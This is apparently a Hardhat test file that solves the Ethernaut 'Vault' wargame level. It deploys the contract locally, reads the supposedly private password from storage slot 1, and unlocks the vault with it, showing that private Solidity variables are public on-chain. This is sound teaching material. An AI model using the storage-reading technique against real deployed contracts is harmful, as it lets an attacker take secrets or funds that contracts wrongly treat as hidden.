import { ethers } from "hardhat";
import { expect } from "chai";

describe("Ethernaut Level 8 - Vault", function () {
  it("Should unlock the vault by reading storage", async function () {
    const [player] = await ethers.getSigners();
    const password = ethers.encodeBytes32String("supersecret");

    const Vault = await ethers.getContractFactory("Vault");
    const vault = await Vault.deploy(password);
    await vault.waitForDeployment();

    // Initially locked
    expect(await vault.locked()).to.be.true;

    // Read private password from slot 1
    const slot1 = await ethers.provider.getStorage(vault.target as string, 1);

    // Unlock using the extracted password
    const tx = await vault.connect(player).unlock(slot1);
    await tx.wait();

    expect(await vault.locked()).to.be.false;
  });
});
